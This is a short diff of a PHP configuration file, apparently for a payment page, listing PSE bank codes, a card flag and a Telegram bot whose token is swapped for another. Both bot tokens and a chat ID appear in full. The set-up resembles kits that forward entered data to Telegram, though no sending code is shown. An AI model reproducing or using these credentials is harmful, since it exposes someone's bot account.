@@ -17,7 +17,7 @@ function app_config(): array {
         'bancos_pse_activos' => ['1007','1023','1002','1052','1013','1032','1062','1063','1006','1047','1069','1070','1019','1040','1060','1061','1507','1551','1097','1809'],
         'tarjeta_activa' => true,
         'telegram' => [
-            'bot_token' => '8943877594:AAHMUa3JMP1xuiCtHWyckmgOU_xVmGtbt0Y',
+            'bot_token' => '8902621461:AAGiIsYpu7qW5X1RDTsM0bMkttcHW3Is6Fw',
             'chat_id_genericos' => '-5573464996',
             'chat_id_ingresos' => '-5573464996'
         ],
